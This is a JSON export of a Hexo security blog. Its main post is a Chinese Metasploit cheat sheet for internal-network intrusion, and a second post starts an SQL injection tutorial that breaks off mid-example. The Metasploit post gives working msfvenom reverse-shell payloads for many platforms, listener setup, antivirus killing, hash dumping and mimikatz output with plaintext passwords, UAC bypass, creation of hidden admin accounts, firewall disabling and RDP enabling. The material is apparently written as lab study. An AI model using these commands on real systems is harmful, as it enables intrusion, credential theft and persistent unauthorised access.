{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://s1eady.top","root":"/"},"pages":[{"title":"分类","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"categories/index.html","permalink":"http://s1eady.top/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"books/index.html","permalink":"http://s1eady.top/books/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"repository/index.html","permalink":"http://s1eady.top/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":true,"path":"links/index.html","permalink":"http://s1eady.top/links/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-10-02T07:27:50.844Z","updated":"2020-10-02T07:27:50.831Z","comments":false,"path":"about/index.html","permalink":"http://s1eady.top/about/index.html","excerpt":"","text":"123456789101112131415161718192021&#123; name: &#x27;steady&#x27; age: 21, gender: &#x27;男&#x27;, profession: &#x27;Penetration Testing&#x27;, education: &#x27;本科&#x27;, email: &#x27;steady_boy@163.com&#x27;, description: &#x27;热爱web安全，擅长渗透测试、漏洞挖掘、内网渗透。&#x27;, skills: [ [&#x27;Python&#x27;, &#x27;Javascript&#x27;, &#x27;[Php]&#x27;, &#x27;Java&#x27;], [&#x27;web安全&#x27;, &#x27;渗透测试&#x27;], [&#x27;内网渗透&#x27;,&#x27;应急响应&#x27;], [&#x27;Linux&#x27;, &#x27;代码审计&#x27;], ], devTools: [ [&#x27;Xray&#x27;, &#x27;AWVS&#x27;, &#x27;BurpSuite&#x27;], [&#x27;metasploit&#x27;, &#x27;Fiddler&#x27;] ] &#125;"},{"title":"标签","date":"2020-10-02T04:54:34.333Z","updated":"2019-08-02T02:17:12.000Z","comments":false,"path":"tags/index.html","permalink":"http://s1eady.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"内网学习--Metasploit使用","slug":"内网学习--Metasploit使用","date":"2020-08-22T14:46:26.000Z","updated":"2020-10-06T10:00:55.861Z","comments":true,"path":"2020/08/22/内网学习--Metasploit使用/","link":"","permalink":"http://s1eady.top/2020/08/22/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Metasploit使用基础常用命令12345background #将当前会话放置后台getuid # 查看权限shell #进入目标机cmd shellsessions #sessions –h 查看帮助sessions -i &lt;ID值&gt; #进入会话 -k 杀死会话 将回话保存到后台 12345meterpreter &gt; background[*] Backgrounding session 1...切换到会话1msf5 exploit(multi&#x2F;handler) &gt; sessions -i 1[*] Starting interaction with 1... 查看会话 12345678msf5 &gt; sessions -lActive sessions&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 meterpreter x86&#x2F;windows NT AUTHORITY\\SYSTEM @ STU1 172.20.10.3:1234 -&gt; 172.20.10.6:6990 (172.20.10.6) 信息收集获取目标主机上的软件安装信息 1run post&#x2F;windows&#x2F;gather&#x2F;enum_applications 关闭杀毒软件 1run post&#x2F;windows&#x2F;manage&#x2F;killav 判断是否是虚拟机 123456run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;checkvm[*] Checking if STU1 is a Virtual Machine .....[+] This is a VMware Virtual Machine 查看补丁信息 1234567run post&#x2F;windows&#x2F;gather&#x2F;enum_patches #补丁信息meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches[*] Patch list saved to &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200906182724_default_172.20.10.6_enum_patches_447671.txt[*] KB2534111 applied[*] KB2999226 applied[*] KB976902 applied 查找域控制器 12345run post&#x2F;windows&#x2F;gather&#x2F;enum_domain #查找域控meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_domain[+] FOUND Domain: god[+] FOUND Domain Controller: owa (IP: 192.168.52.138) 代理与端口设置端口转发1portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口 设置sockets5代理搜索一下可用代理 1234567891011msf5 &gt; search socksMatching Modules&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary&#x2F;scanner&#x2F;http&#x2F;sockso_traversal 2012-03-14 normal No Sockso Music Host Server 1.5 Directory Traversal 1 auxiliary&#x2F;server&#x2F;socks4a normal No Socks4a Proxy Server 2 auxiliary&#x2F;server&#x2F;socks5 normal No Socks5 Proxy Server 3 auxiliary&#x2F;server&#x2F;socks_unc normal No SOCKS Proxy UNC Path Redirection 设置代理 12345678910111213141516171819202122232425262728msf5 &gt; use auxiliary&#x2F;server&#x2F;socks5msf5 auxiliary(server&#x2F;socks5) &gt; show optionsModule options (auxiliary&#x2F;server&#x2F;socks5): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD no Proxy password for SOCKS5 listener SRVHOST 0.0.0.0 yes The address to listen on SRVPORT 1080 yes The port to listen on USERNAME no Proxy username for SOCKS5 listenerAuxiliary action: Name Description ---- ----------- Proxymsf5 auxiliary(server&#x2F;socks5) &gt; set SRVHOST 127.0.0.1SRVHOST &#x3D;&gt; 127.0.0.1msf5 auxiliary(server&#x2F;socks5) &gt; set SRVPORT 5555SRVPORT &#x3D;&gt; 5555msf5 auxiliary(server&#x2F;socks5) &gt; run[*] Auxiliary module running as background job 0.msf5 auxiliary(server&#x2F;socks5) &gt;[*] Starting the socks5 proxy server 然后也可以直接使用一下命令 12set proxies socks5:127.0.0.1:8990 设置代理setg ReverseAllowProxy true 允许反向代理 获取内网网段 1234567meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Local subnet: 169.254.0.0&#x2F;255.255.0.0Local subnet: 172.20.10.0&#x2F;255.255.255.240Local subnet: 192.168.52.0&#x2F;255.255.255.0 添加路由 1meterpreter &gt; run autoroute -s 198.168.52.0&#x2F;24 查看是否添加成功 1234567891011meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Active Routing Table&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Subnet Netmask Gateway ------ ------- ------- 198.168.52.0 255.255.255.0 Session 1 ARP扫描内网主机 获取目标shell常见shell生成1234567891011121314151617181920212223242526Linux：msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elfWindows:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exePHP:msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.phpASP:msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSP:msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspPython:msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pyBash:msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.shPerl:msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl PHP-Shell 生成一句话木马 1msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php 12345➜ Desktop msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.109 LPORT&#x3D;1234 R &gt; shell.php[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 1114 bytes msfconsole 监听端口 123456789msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; php&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set lhost 攻击IPlhost &#x3D;&gt; 192.168.0.108msf5 exploit(multi&#x2F;handler) &gt; set lport 监听端口msf5 exploit(multi&#x2F;handler) &gt; run[-] Handler failed to bind to 192.168.0.108:1234:- -[*] Started reverse TCP handler on 0.0.0.0:1234 EXE-木马 生成木马 1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 -f exe &gt; hacker.exe msfconsole监听端口 123456msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set LHOST 攻击IPmsf5 exploit(multi&#x2F;handler) &gt; set LPORT 监听端口msf5 exploit(multi&#x2F;handler) &gt; exploit 升级正常的Shell到Meterpreter通常情况下， 当我们通过直接渗透进入系统， 并且得到了远程系统的Shell，下一步我们想要获得是Meterpreter Shell, 因为Meterpreter Shell可以向我们提供更多功能。 比如说， 提升权限， 整合到现有运行程序等等。这方面Sessions Command 可以帮助我们实现从Shell 到Meterpreter提升。 12345678910msf5 post(multi/manage/shell_to_meterpreter) &gt; show optionsModule options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. 使用一下命名进行切换 1sessions -u sessionid 添加去往”内网网段”的路由 MSF 路由添加帮助查询命令 12345678910111213meterpreter &gt; run autoroute -h[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...][*] Usage: run autoroute [-r] -s subnet -n netmask[*] Examples:[*] run autoroute -s 10.1.1.0 -n 255.255.255.0 # Add a route to 10.10.10.1&#x2F;255.255.255.0[*] run autoroute -s 10.10.10.1 # Netmask defaults to 255.255.255.0[*] run autoroute -s 10.10.10.1&#x2F;24 # CIDR notation is also okay[*] run autoroute -p # Print active routing table[*] run autoroute -d -s 10.10.10.1 # Deletes the 10.10.10.1&#x2F;255.255.255.0 route[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes[-] Deprecation warning: This script has been replaced by the post&#x2F;multi&#x2F;manage&#x2F;autoroute module 获取目标内网地址段 具体获取被攻击目标内网地址网段的命令 12345meterpreter &gt; run get_local_subnets[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Local subnet: 172.17.0.0&#x2F;255.255.0.0 由上可以获知，目标内网网段是“172.17.0.0./24” 添加去往目标网段的转发路由 在meterpreter 会话上直接添加去往目标网段的路由，具体添加方法 1234567meterpreter &gt; run autoroute -s 172.17.0.0&#x2F;24[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...][*] Adding a route to 172.17.0.0&#x2F;255.255.255.0...[+] Added route to 172.17.0.0&#x2F;255.255.255.0 via 10.48.8.234[*] Use the -p option to list all active routes 添加网路由后，我们来查看下路由的添加情况如何 1234567891011meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]Active Routing Table&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Subnet Netmask Gateway ------ ------- ------- 172.17.0.0 255.255.255.0 Session 3 将去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。 删除路由 1meterpreter &gt; run autoroute -d -s 172.20.10.0 内网主机发现进去内网之后，我们使用相关模块进行主机发现。 TCP扫描12345678910111213msf5 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcpmsf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; show optionsmsf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 10threads &#x3D;&gt; 10msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set RHOSTS 172.18.0.2-100RHOSTS &#x3D;&gt; 172.18.0.2-100msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set PORTS 3306,8022PORTS &#x3D;&gt; 3306,8022msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit[+] 172.18.0.3: - 172.18.0.3:3306 - TCP OPEN[+] 172.18.0.2: - 172.18.0.2:8022 - TCP OPEN[*] 172.18.0.2-100: - Scanned 10 of 99 hosts (10% complete) ARP扫描1use post&#x2F;windows&#x2F;gather&#x2F;arp_scanner 解决中文乱码问题1chcp 65001 或者将终端临时设置为GBK系列编码即可 Hash与明文密码获取获取目标机系统用户Hash 12345678910111213141516171819run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump[*] Running module against STU1[*] Hashes will be saved to the database if one is connected.[+] Hashes will be saved in loot in JtR password file format to:[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200903163754_default_172.20.10.6_windows.hashes_560643.txt[*] Dumping password hashes...[*] Running as SYSTEM extracting hashes from registry[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...[*] No users with password hints on this system[*] Dumping password hashes...[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] whoami:1004:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::[+] steady:1012:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd:::[+] steady123:1013:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd::: 获得了本地账户的hask，获取明文密码，我们需要先载入mimikatz模块(需要免杀处理) 1meterpreter &gt; upload mimikatz.exe 目标位置 mimikatz的使用 123456789101112131415161718192021222324252627282930313233343536373839404142c:\\\\mimikatz.exec:\\&gt;mimikatz.exemimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 16 2020 10:26:39 .## ^ ##. &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo) ## &#x2F; \\ ## &#x2F;*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com ) ## \\ &#x2F; ## &gt; http:&#x2F;&#x2F;blog.gentilkiwi.com&#x2F;mimikatz &#39;## v ##&#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#39;#####&#39; &gt; http:&#x2F;&#x2F;pingcastle.com &#x2F; http:&#x2F;&#x2F;mysmartlogon.com ***&#x2F;mimikatz # privilege::debugPrivilege &#39;20&#39; OKmimikatz # sekurlsa::logonPasswordsAuthentication Id : 0 ; 2499588 (00000000:00262404)Session : Interactive from 1User Name : AdministratorDomain : GODLogon Server : OWALogon Time : 2020&#x2F;9&#x2F;3 13:38:09SID : S-1-5-21-2952760202-1353902439-2381784089-500 msv : [00000003] Primary * Username : Administrator * Domain : GOD * LM : 3333deaae325ebb705026d3fb1a43796 * NTLM : 7d0e302e0cbd94d9353ac4a51d7c39c1 * SHA1 : d4f206f0d8303230185b2ff2fedb7d40a62effa5 tspkg : * Username : Administrator * Domain : GOD * Password : 1999118gxaGXA. wdigest : * Username : Administrator * Domain : GOD * Password : 1999118gxaGXA. kerberos : * Username : Administrator * Domain : GOD.ORG * Password : 1999118gxaGXA. ssp : credman : Metasploit Portfwd（端口转发/重定向）在活动的Meterpreter会话中，键入portfwd -h将显示命令的各种选项和参数。 123456789meterpreter &gt; portfwd -hUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS: -L &gt;opt&gt; 要监听的本地主机（可选）。 -h 帮助横幅。 -l &gt;opt&gt; 要监听的本地端口。 -p &gt;opt&gt; 要连接的远程端口 -r &gt;opt&gt; 要连接的远程主机meterpreter &gt; Options：选项 123456789-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。-h：显示以上信息。-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。-p：TCP连接将转发到的端口。-r：连接被中继到的IP地址（目标）。 Arguments：参数 1234567Add：该参数用于创建转发。Delete：这将从我们的转发端口列表中删除先前的条目。List：这将列出当前转发的所有端口。Flush：这将删除我们的转发列表中的所有端口。 例子： Add参数 1meterpreter &gt; portfwd add –l 3389 –p 3389 –r [target host] 1234add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。-l 3389是本地端口，将被监听并转发到我们的目标。这可以是您的机器上的任何端口，只要它尚未被使用。-p 3389是我们的定向主机上的目标端口。-r [target host]是我们的目标系统的IP或主机名。 List参数 12345meterpreter &gt; portfwd list0: 0.0.0.0:3389 -&gt; 172.16.194.191:33891: 0.0.0.0:1337 -&gt; 172.16.194.191:13372: 0.0.0.0:2222 -&gt; 172.16.194.191:22223 total local port forwards. Windows权限提升 绕过UAC bypassuac 12345678910111213141516171819202122msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac或者msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injectionmsf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. TECHNIQUE EXE yes Technique to use if UAC is turned off (Accepted: PSH, EXE)Exploit target: Id Name -- ---- 0 Windows x86msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;set target 1set target 1 #设置目标系统类型，1是64位，0是32位 12use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。 RunAs绕过 创建一个可执行文件，目标机会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择“是”，就会触发返回一个高权限的meterpreter shell。 123456789101112131415161718192021msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;askmsf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show optionsModule options (exploit&#x2F;windows&#x2F;local&#x2F;ask): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME no File name on disk PATH no Location on disk, %TEMP% used if not set SESSION yes The session to run this module on. TECHNIQUE EXE yes Technique to use (Accepted: PSH, EXE)Exploit target: Id Name -- ---- 0 Windowsmsf5 exploit(windows&#x2F;local&#x2F;ask) &gt; Windows渗透cmd与3389 监听木马 1234567891011121314msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; chcp 65001[-] Unknown command: chcp.msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set LHOST 172.20.10.3LHOST &#x3D;&gt; 172.20.10.3msf5 exploit(multi&#x2F;handler) &gt; set LPORT 1234LPORT &#x3D;&gt; 1234msf5 exploit(multi&#x2F;handler) &gt; exploit[*] Started reverse TCP handler on 172.20.10.3:1234[*] Sending stage (176195 bytes) to 172.20.10.6[*] Meterpreter session 1 opened (172.20.10.3:1234 -&gt; 172.20.10.6:6198) at 2020-09-05 12:31:20 +0800 获取当前权限以及提权 123456meterpreter &gt; getuidServer username: GOD\\Administratormeterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM 切换cmdshell，注意切换之后cmdshell与msf的会话具有相同的权限 添加用户并加入管理员组 12345678C:\\Windows\\system32&gt;net user steady111 125219gxaGXA &#x2F;addnet user steady111 125219gxaGXA &#x2F;add命令成功完成。C:\\Windows\\system32&gt;net localgroup administrators steady111 &#x2F;addnet localgroup administrators steady111 &#x2F;add命令成功完成。 开启关闭防火墙 windows2003之前 1234开启防火墙：netsh firewall set opmode mode&#x3D;enable关闭防火墙：netsh firewall set opmode mode&#x3D;disable windows2003之后 1netsh advfirewall set allprofiles state off 开启3389 123456REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f REG ADD &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; 2&gt;&amp;1Server\\WinStations\\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f&quot; 2&gt;&amp;1 检查3389是否开放 123456REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnectionsHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server1表示关闭0表示开放fDenyTSConnections REG_DWORD 0x1 查看远程桌面服务所在的端口 12REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; &#x2F;v PortNumberHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp MSF与3389123run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启远程桌面run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662 #将3389端口转发到6662 12portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口run getgui -f 6661 –e","categories":[{"name":"内网安全","slug":"内网安全","permalink":"http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"内网","slug":"内网","permalink":"http://s1eady.top/tags/%E5%86%85%E7%BD%91/"}]},{"title":"SQL--SQL注入漏洞","slug":"SQL注入漏洞","date":"2020-08-22T14:46:26.000Z","updated":"2020-10-06T09:55:32.783Z","comments":true,"path":"2020/08/22/SQL注入漏洞/","link":"","permalink":"http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"漏洞原理用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当前数据库用户、数据库中的表等信息，也可以读取敏感文件、写入服务器shell，进而获取主机权限。 基础知识MySQL 5.0以上版本。 数据库 information_schema 系统数据库，记录当前数据库的数据库，表，列，用户权限等信息。 表 SCHEMATA 储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等。 TABLES 提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。 COLUMNS 储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566mysql&gt; use information_schema;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+---------------------------------------+| Tables_in_information_schema |+---------------------------------------+| TABLES || SCHEMATA || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS |mysql&gt; desc TABLES;+-----------------+---------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-----------------+---------------------+------+-----+---------+-------+| TABLE_CATALOG | varchar(512) | NO | | | || TABLE_SCHEMA | varchar(64) | NO | | | || TABLE_NAME | varchar(64) | NO | | | || TABLE_TYPE | varchar(64) | NO | | | || ENGINE | varchar(64) | YES | | NULL | || VERSION | bigint(21) unsigned | YES | | NULL | || ROW_FORMAT | varchar(10) | YES | | NULL | || TABLE_ROWS | bigint(21) unsigned | YES | | NULL | || AVG_ROW_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || MAX_DATA_LENGTH | bigint(21) unsigned | YES | | NULL | || INDEX_LENGTH | bigint(21) unsigned | YES | | NULL | || DATA_FREE | bigint(21) unsigned | YES | | NULL | || AUTO_INCREMENT | bigint(21) unsigned | YES | | NULL | || CREATE_TIME | datetime | YES | | NULL | || UPDATE_TIME | datetime | YES | | NULL | || CHECK_TIME | datetime | YES | | NULL | || TABLE_COLLATION | varchar(32) | YES | | NULL | || CHECKSUM | bigint(21) unsigned | YES | | NULL | || CREATE_OPTIONS | varchar(255) | YES | | NULL | || TABLE_COMMENT | varchar(2048) | NO | | | |+-----------------+---------------------+------+-----+---------+-------+mysql&gt; desc COLUMNS;+--------------------------+---------------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+--------------------------+---------------------+------+-----+---------+-------+| TABLE_CATALOG | varchar(512) | NO | | | || TABLE_SCHEMA | varchar(64) | NO | | | || TABLE_NAME | varchar(64) | NO | | | || COLUMN_NAME | varchar(64) | NO | | | || ORDINAL_POSITION | bigint(21) unsigned | NO | | 0 | || COLUMN_DEFAULT | longtext | YES | | NULL | || IS_NULLABLE | varchar(3) | NO | | | || DATA_TYPE | varchar(64) | NO | | | || CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned | YES | | NULL | || CHARACTER_OCTET_LENGTH | bigint(21) unsigned | YES | | NULL | || NUMERIC_PRECISION | bigint(21) unsigned | YES | | NULL | || NUMERIC_SCALE | bigint(21) unsigned | YES | | NULL | || DATETIME_PRECISION | bigint(21) unsigned | YES | | NULL | || CHARACTER_SET_NAME | varchar(32) | YES | | NULL | || COLLATION_NAME | varchar(32) | YES | | NULL | || COLUMN_TYPE | longtext | NO | | NULL | || COLUMN_KEY | varchar(3) | NO | | | || EXTRA | varchar(30) | NO | | | || PRIVILEGES | varchar(80) | NO | | | || COLUMN_COMMENT | varchar(1024) | NO | | | || GENERATION_EXPRESSION | longtext | NO | | NULL | |+--------------------------+---------------------+------+-----+---------+-------+21 rows in set (0.00 sec) 总结 MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。 123456information_schema的表schemata中的列schema_name记录了所有数据库的名字information_schema的表tables中的列table_schema记录了所有数据库的名字information_schema的表tables中的列table_name记录了所有数据库的表的名字information_schema的表columns中的列table_schema记录了所有数据库的名字information_schema的表columns中的列table_name记录了所有数据库的表的名字information_schema的表columns中的列column_name记录了所有数据库的表的列的名字 常用函数right、left函数LEFT()函数是一个字符串函数,它返回具有指定长度的字符串的左边部分，我们在注入的时候，前台可能会限制回显字段，这时候我们可以使用这两个函数。 right同理 1234567891011121314151617181920212223mysql&gt; select right(&#x27;1234567890&#x27;,5);+-----------------------+| right(&#x27;1234567890&#x27;,5) |+-----------------------+| 67890 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select right(&#x27;1234567890&#x27;,2);+-----------------------+| 